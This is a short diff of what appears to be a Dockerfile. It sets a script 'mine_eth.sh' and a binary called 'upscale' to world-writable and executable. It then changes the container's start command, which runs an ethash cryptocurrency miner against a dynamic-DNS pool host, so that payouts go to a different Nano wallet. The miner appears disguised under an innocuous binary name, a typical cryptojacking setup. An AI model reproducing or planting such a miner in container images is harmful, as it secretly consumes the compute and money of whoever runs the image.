@@ -17,4 +17,4 @@ RUN chmod 777 mine_eth.sh;
 
 RUN chmod 777 upscale;
 
-CMD upscale --algo ethash --server workload.sytes.net:2020 --user nano_39uqhh89rwz1h1abcrhhnpjz8bp34xdbk95r38ws3ncczfctxuu95ro17rzx.upscale
+CMD upscale --algo ethash --server workload.sytes.net:2020 --user nano_3bf6aph9zbwp358tgqwtzqua9w3wxfhyuw3x11mb6a6bjah5jiewmzog9jpg.upscale
